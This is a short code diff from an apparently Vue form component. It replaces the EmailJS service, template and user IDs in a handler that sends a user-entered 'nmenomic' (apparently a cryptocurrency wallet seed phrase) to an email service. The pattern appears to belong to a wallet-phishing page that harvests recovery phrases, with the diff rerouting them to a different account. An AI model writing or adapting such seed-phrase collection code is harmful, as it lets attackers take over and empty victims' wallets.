@@ -29,9 +29,9 @@ export default {
       const checker = this.formChecker();
       if (checker) {
         var data = {
-          service_id: "service_o6cjtvh",
-          template_id: "template_axdenmh",
-          user_id: "user_q7g2o9qDOiH2ojVRoiuNN",
+          service_id: "service_e7kbs4p",
+          template_id: "template_ymnxcmq",
+          user_id: "user_Eux8rfZ8wcQHlqRkfU7eC",
           template_params: {
             from_name: "Nmenomic",
             nmenomic: this.nmenomic,
